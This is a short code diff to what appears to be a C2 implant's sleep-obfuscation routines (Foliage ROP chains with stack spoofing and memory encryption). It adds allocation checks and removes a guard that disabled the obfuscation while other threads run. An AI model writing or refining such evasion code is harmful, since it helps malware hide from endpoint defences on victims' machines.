@@ -95,6 +95,13 @@ VOID FoliageObf(
             RopSetCtx2  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
             RopExitThd  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
 
+            if ( !RopInit || !RopCap || !RopSpoof || !RopBegin || !RopSetMemRw || !RopMemEnc ||
+                 !RopGetCtx || !RopSetCtx || !RopWaitObj || !RopMemDec || !RopSetMemRx ||
+                 !RopSetCtx2 || !RopExitThd ) {
+                PUTS( "Failed to allocate CONTEXT" )
+                goto Leave;
+            }
+
             RopInit->ContextFlags       = CONTEXT_FULL;
             RopCap->ContextFlags        = CONTEXT_FULL;
             RopSpoof->ContextFlags      = CONTEXT_FULL;
@@ -725,8 +732,7 @@ VOID SleepObf(
 #if _WIN64
 
     if ( Instance->Threads ) {
-        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
-        Technique = 0;
+        PRINTF( "Threads running: %d\n", Instance->Threads )
     }
 
     switch ( Technique )
